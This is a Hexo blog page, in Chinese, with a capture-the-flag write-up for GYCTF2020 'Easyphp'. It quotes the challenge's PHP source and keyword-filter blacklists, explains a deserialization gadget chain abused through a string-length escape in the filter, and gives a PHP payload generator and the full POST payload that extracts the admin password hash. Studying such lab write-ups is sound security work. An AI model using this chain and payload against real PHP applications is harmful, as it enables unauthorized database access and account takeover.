@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>GYCTF2020Easyphp | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="源码泄露 www.ziplogin.php 过滤了一堆的关键字 12if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&amp;#x27;username&amp;#x27;]))&amp;#123;		die(&quot;&lt;br&gt;Damn you, hacker!&quot;);  重点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020Easyphp">
+<meta property="og:url" content="http://example.com/2021/09/22/page-121/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="源码泄露 www.ziplogin.php 过滤了一堆的关键字 12if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&amp;#x27;username&amp;#x27;]))&amp;#123;		die(&quot;&lt;br&gt;Damn you, hacker!&quot;);  重点">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-22T10:02:05.000Z">
+<meta property="article:modified_time" content="2021-09-22T10:15:18.652Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-page-121" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/22/page-121/" class="article-date">
+  <time class="dt-published" datetime="2021-09-22T10:02:05.000Z" itemprop="datePublished">2021-09-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      GYCTF2020Easyphp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="源码泄露-www-zip"><a href="#源码泄露-www-zip" class="headerlink" title="源码泄露 www.zip"></a>源码泄露 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></h4><p>login.php 过滤了一堆的关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;</span><br><span class="line">		die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>重点在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib.php update.php实例化一个user然后只要session[&#x27;login&#x27;]===1就可以有flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>update.php里判断没有登录后会继续执行$user()-&gt;update() 所以应该得从update.php那边传参</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update()&#123;</span><br><span class="line">    $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">    //这个功能还没有写完 先占坑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先反序列化<strong>getNewinfo()返回值</strong> 调用updatehelper </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getNewinfo ：</span><br><span class="line">public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<strong>age</strong>和<strong>nickname</strong>然后返回<strong>safe</strong>处理后的**Info()**序列化结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="safe将一些关键字替换成hacker-这强行替换会造成额外读取-就可以控制了"><a href="#safe将一些关键字替换成hacker-这强行替换会造成额外读取-就可以控制了" class="headerlink" title="safe将一些关键字替换成hacker 这强行替换会造成额外读取 就可以控制了"></a>safe将一些关键字替换成hacker 这强行替换会造成额外读取 就可以控制了</h5><p>Info类是简单的赋值 当调用一个不存在的方法时会<strong>调用CtrlCase-&gt;login()</strong><br>UpdateHelper类的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用newinfo和sql构造 销毁时又会显示sql 正常登录后newInfo应该时admin用户id sql应该在Info类所以$this-&gt;sql为空</strong><br>现在看来就剩下一个了，通过某种方法得到admin的密码，登录得到flag。而要得到flag，很明显只有通过SQL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info类的__call方法很明显要我们调用dbCtrl的login()方法，让我们任意执行SQL语句。得到admin用户的SQL语句不难写select password,username from user where username=?，因为login()返回的是idResult，第一个结果。Info的__call如何别触发？</span><br></pre></td></tr></table></figure>
+
+<p>User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，然后我们就看到了_ _toString()方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    return &quot;0-0&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname unserialize(getNewInfo())得到的 如果nickname是info类，nickname-&gt;update就会触发info的_ _call _ _tostring需要一个输出字符串的地方才会被调用 UpdatHelper的__destruct 会echo this-&gt;sql User类中UpdateHelper的调用中\)Info会被赋值成$this-&gt;sql。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new UpdateHelper()，调用__destruct()，转向new User()的__toString()，调用nickname-&gt;update()，转向new Info()的__call，最终转向new dbCtrl()带出admin的密码 发序列化出updateHelper的类</span><br><span class="line">输入点是getNewInfo()引入Info类  要将updatehelper类放入info中就调用__destruct时 在正常调用正常调用User()-&gt;update()的时候Info-&gt;CtrlCase没有任何意义 把Info-&gt;CtrlCase设置成UpdateHelper类？unserialize()结束后由于没有用到CtrlCase，所以会执行__destruct</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age = null;</span><br><span class="line">    public $nickname = null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo = unserialize($newInfo);</span><br><span class="line">        $upDate = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname = &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser = &quot;root&quot;;</span><br><span class="line">    public $dbpass = &quot;root&quot;;</span><br><span class="line">    public $database = &quot;test&quot;;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token = &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db = new dbCtrl();</span><br><span class="line">$user = new User();</span><br><span class="line">$info = new Info(&quot;23333&quot;, &quot;Tiaonmmn&quot;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper = new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = &quot;select password,id from username where username=?&quot;;</span><br><span class="line">$updatehelper-&gt;sql = $user;</span><br><span class="line">#echo serialize($updatehelper);</span><br><span class="line">$realinfo = new Info(&quot;233333&quot;, &quot;Tiaonmmn&quot;);</span><br><span class="line">$realinfo-&gt;CtrlCase = $updatehelper;</span><br><span class="line">echo serialize($realinfo);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成符合getNewInfo的序列了<br>输入age和nickname参数，CtrlCase没办法传进去 return的时候有个safe函数简单地替换了字符，把相应字符串替换成hacker，那么原来序列化的字符串就有相当大的几率被破坏掉，PHP序列化时计算的字符串长度与实际字符串长度不对应，就<strong>可以逃逸出来插入想要的内容了</strong></p>
+<p>update.php 那边</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post：</span><br><span class="line">age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交就会返回admin的MD5，注意最后面加上了一个“0-0”。 解密就可以登录，拿到flag了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/22/page-121/" data-id="cktvd14ag0001xkw7hi312m1q" data-title="GYCTF2020Easyphp" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/22/page-120/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">红明谷CTF 2021write shell</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-119/">page</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-117/">第五空间misc</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
